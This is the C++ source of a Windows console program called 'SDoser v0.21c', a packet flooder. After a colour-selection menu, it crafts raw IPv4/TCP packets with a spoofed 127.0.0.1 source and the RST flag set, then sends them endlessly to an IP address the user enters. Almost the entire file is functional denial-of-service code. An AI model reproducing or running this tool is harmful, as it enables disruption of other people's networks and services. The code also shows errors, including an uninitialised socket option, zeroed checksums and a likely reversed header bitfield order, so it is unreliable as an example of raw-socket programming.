#include "stdafx.h"
#include <winsock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <conio.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)

/*
SDoser v0.21c
*/

//TCP
typedef struct tcp_hdr {
	unsigned short port;
	unsigned short lport;
	unsigned int sequence;
	unsigned int acknowledge;

	unsigned char data_offset : 4;
	unsigned char reserved_part : 3;
	unsigned char ns : 1;
	unsigned char cwr : 1;
	unsigned char ecn : 1;

	unsigned char urg : 1;
	unsigned char ack : 1;
	unsigned char psh : 1;
	unsigned char rst : 1;
	unsigned char syn : 1;
	unsigned char fin : 1;

	unsigned short window;
	unsigned short sum;
	unsigned short urgent_pointer;
}TCP_HDR;

//IP
typedef struct ip_hdr {
	unsigned char ip_version : 4;
	unsigned char ip_header_len : 4;
	unsigned char ip_tos;
	unsigned short ip_total_length;
	unsigned short ip_id;

	unsigned char ip_reserved_zero : 1;
	unsigned char ip_dont_fragment : 1;
	unsigned char ip_more_fragment : 1;

	unsigned char ip_fragment_offset_1 : 5;
	unsigned char ip_fragment_offset_2;

	unsigned char ip_ttl;
	unsigned char ip_protocol;
	unsigned short ip_sum;
	unsigned int ip_src_addr;
	unsigned int ip_dest_addr;
}IPV4_HDR;

void Draw_logo() {
	std::cout << "\t\t\t\tSDoser v0.21c" << std::endl << std::endl;
}

void menu() {
	bool exit = false;
	bool first = true;
	int choose = 0;
	char color[10] = "";
	const char *color_1 = "color f";
	const char *color_2 = "color a";
	const char *color_3 = "color b";
	const char *color_4 = "color c";
	const char *color_5 = "color d";
	int num = 0;

	while(exit == false) {
		if(first == false) {
			num = _getch();
			switch(num) {
			case 72:
				if(choose > 0) {
					choose--;
				} else {
					choose = 4;
				}
				break;
			case 80:
				if(choose < 4) {
					choose++;
				} else {
					choose = 0;
				}
				break;
			case 27:
				exit = true;
				break;
			case 75:
				exit = true;
				break;
			}
			system("cls");
		}
		Draw_logo();
		const char* colors[] = { "White", "Green", "Blue ", "Red  ", "Pink " };
		for(int i = 0; i < sizeof(colors) / sizeof(*colors); ++i) {
			std::cout << i << ") " << colors[i] << "     " << (choose == i ? "<-\n" : "  \n");
		}
		first = false;
	}

	std::cout << "\n";

	switch(choose) {
	case 0:
		strcat_s(color, color_1);
		system("color f");
		break;
	case 1:
		strcat_s(color, color_2);
		system("color a");
		break;
	case 2:
		strcat_s(color, color_3);
		system("color b");
		break;
	case 3:
		strcat_s(color, color_4);
		system("color c");
		break;
	case 4:
		strcat_s(color, color_5);
		system("color d");
		break;
	default:
		strcat_s(color, color_1);
		system("color f");
		break;
	}
}

int main() {
	menu();

	SOCKET dos_socket = INVALID_SOCKET;
	WSADATA wsaData;
	SOCKADDR_IN	destAddr;
	int Result;
	int payload = 512, optVal;
	char buf[1024];
	char *data = NULL;

	IPV4_HDR *HDR = NULL;
	TCP_HDR *TCP = NULL;

	//Initialize.

	Result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if(Result != 0) {
		printf("Initialized failed with error: %d\n", Result);
		return 1;
	}

	//Create Raw Socket
	dos_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(dos_socket == INVALID_SOCKET) {
		printf("creation of dos_socket failed with error: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	//Setup socket in Raw Mode
	Result = setsockopt(dos_socket, IPPROTO_IP, IP_HDRINCL, (char *)&optVal, sizeof(optVal));
	if(Result != 0) {
		printf("setsockopt failed with error: %d\n", WSAGetLastError());
		closesocket(dos_socket);
		WSACleanup();
		return 1;
	}

	//Input Target IP
	std::cout << "\nIP:\t";
	char ip[32];
	gets_s(ip);
	destAddr.sin_addr.S_un.S_addr = inet_addr(ip);
	destAddr.sin_port = htons(50000);
	destAddr.sin_family = AF_INET;

	//Setup IP
	HDR = (IPV4_HDR *)buf;
	HDR->ip_version = 4;
	HDR->ip_header_len = 5;
	HDR->ip_tos = 0;
	HDR->ip_total_length = htons(sizeof(IPV4_HDR) + sizeof(TCP_HDR) + payload);
	HDR->ip_id = htons(2);
	HDR->ip_fragment_offset_1 = 0;
	HDR->ip_fragment_offset_2 = 0;
	HDR->ip_reserved_zero = 0;
	HDR->ip_dont_fragment = 1;
	HDR->ip_more_fragment = 0;
	HDR->ip_ttl = 8;
	HDR->ip_protocol = IPPROTO_TCP;
	HDR->ip_src_addr = inet_addr("127.0.0.1");
	HDR->ip_dest_addr = inet_addr(inet_ntoa(destAddr.sin_addr));
	HDR->ip_sum = 0;

	//Setup TCP
	TCP = (TCP_HDR *)&buf[sizeof(IPV4_HDR)];	// get the pointer to the tcp header in the packet
	TCP->port = htons(1234);
	TCP->lport = htons(50000);
	TCP->ns = 1;
	TCP->cwr = 0;
	TCP->ecn = 1;
	TCP->urg = 0;
	TCP->ack = 0;
	TCP->psh = 0;
	TCP->rst = 1;
	TCP->syn = 0;
	TCP->fin = 0;
	TCP->sum = 0;
	//Initialize the TCP payload
	data = &buf[sizeof(IPV4_HDR) + sizeof(TCP_HDR)];
	memset(data, '^', payload);

	printf("\nSending Packets...\n");

	//Keyboard
	int k = 1;
	int l = 0;
	int p = 0;
	char loading;
	while(!_kbhit()) {
		// | \ - /
		switch(l) {
		case 0:
			if(loading != '|') {
				loading = '|';
			}
			if(p >= 500) {
				l++;
				p = 0;
			} else {
				p++;
			}
			break;
		case 1:
			if(loading != '/') {
				loading = '/';
			}
			if(p >= 500) {
				l++;
				p = 0;
			} else {
				p++;
			}
			break;
		case 2:
			if(loading != '-') {
				loading = '-';
			}
			if(p >= 500) {
				l++;
				p = 0;
			} else {
				p++;
			}
			break;
		case 3:
			if(loading != '\\') {
				loading = '\\';
			}
			if(p >= 500) {
				l = 0;
				p = 0;
			} else {
				p++;
			}
			break;
		}

		std::cout << "  " << loading;
		printf(" %d packets send\r", k++);
		Result = sendto(dos_socket, buf, sizeof(IPV4_HDR) + sizeof(TCP_HDR) + payload,
			0, (SOCKADDR *)&destAddr, sizeof(destAddr));
		if(Result == SOCKET_ERROR) {
			printf("Error sending Packet : %d\n", WSAGetLastError());
			break;
		}
	}

	//Clean
	WSACleanup();
	closesocket(dos_socket);

	system("pause");
	return 0;
}